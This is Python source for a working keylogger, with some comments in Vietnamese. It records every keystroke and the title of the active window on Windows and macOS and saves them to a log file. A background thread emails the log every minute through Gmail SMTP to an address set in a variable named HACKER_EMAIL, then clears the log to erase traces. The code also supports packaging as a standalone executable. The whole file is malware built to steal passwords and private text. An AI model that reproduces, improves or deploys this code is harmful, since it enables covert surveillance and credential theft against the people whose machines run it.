import os
import ctypes
import platform
import subprocess
import smtplib
import threading
import time
from email.message import EmailMessage
from datetime import datetime
from pynput import keyboard
from dotenv import load_dotenv
import sys


if getattr(sys, 'frozen', False):
    env_path = os.path.join(sys._MEIPASS, '.env')
else:
    env_path = os.path.join(os.path.dirname(__file__), '.env')
    
load_dotenv(dotenv_path=env_path)

LOG_FILE = os.getenv("LOG_FILE", "system_logs.txt")
SMTP_EMAIL = os.getenv("SMTP_EMAIL", "")
SMTP_PASSWORD = os.getenv("SMTP_PASSWORD", "")
HACKER_EMAIL = os.getenv("HACKER_EMAIL", SMTP_EMAIL) 
REPORT_INTERVAL = int(os.getenv("REPORT_INTERVAL", 60)) 

def get_active_window_title() -> str:
    """Hàm tự động nhận diện hệ điều hành và trích xuất tiêu đề cửa sổ"""
    current_os = platform.system()
    
    try:
        if current_os == "Windows":
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
            return buff.value if buff.value else "Unknown Windows App"
            
        elif current_os == "Darwin":

            script = 'tell application "System Events" to get name of first application process whose frontmost is true'
            result = subprocess.run(['osascript', '-e', script], capture_output=True, text=True)
            return result.stdout.strip() if result.stdout else "Unknown Mac App"
            
        else:
            return f"Unsupported OS: {current_os}"
            
    except Exception:
        return "Unknown Window"

def send_log_via_email():
    if not os.path.exists(LOG_FILE):
        print("[DEBUG] Missing log file.")
        return
        
    with open(LOG_FILE, "r", encoding="utf-8") as f:
        log_data = f.read()
        
    if not log_data.strip():
        print("[DEBUG] Log file is empty. Skipping email.")
        return

    msg = EmailMessage()
    msg.set_content(log_data)
    msg['Subject'] = f"PapaNote Keylogger Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
    msg['From'] = SMTP_EMAIL
    msg['To'] = HACKER_EMAIL

    try:
        print(f"[DEBUG] Connecting to SMTP with: {SMTP_EMAIL}...")
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(SMTP_EMAIL, SMTP_PASSWORD)
        server.send_message(msg)
        server.quit()
        print("[DEBUG] Email sent SUCCESSFULLY!")
        
        # Xóa dấu vết sau khi gửi thành công
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write("")
    except Exception as e:
        print(f"[ERROR] SMTP Failed: {e}")

def report_loop():
    while True:
        time.sleep(REPORT_INTERVAL)
        if SMTP_EMAIL and SMTP_PASSWORD:
            send_log_via_email()
        else:
            print("[DEBUG] SMTP credentials missing in .env")

def start_keylogger() -> None:
    current_window = ""

    def on_press(key):
        nonlocal current_window
        
        try:
            active_window = get_active_window_title()
            
            # Ghi lại tiêu đề khi người dùng chuyển sang cửa sổ mới
            if active_window != current_window:
                current_window = active_window
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(f"\n\n[{timestamp}] [Window: {current_window}]\n")
        except Exception:
            pass

        k = ""
        
        if hasattr(key, 'char') and key.char is not None:
            k = key.char
        else:
            if key == keyboard.Key.space:
                k = " "
            elif key == keyboard.Key.enter:
                k = "[ENTER]\n"
            elif key == keyboard.Key.tab:
                k = "[TAB]\t"
            elif key == keyboard.Key.backspace:
                k = "[BACKSPACE]"
            else:
                k = f"[{str(key).replace('Key.', '').upper()}]"

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(k)
            
    reporter_thread = threading.Thread(target=report_loop, daemon=True)
    reporter_thread.start()
            
    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()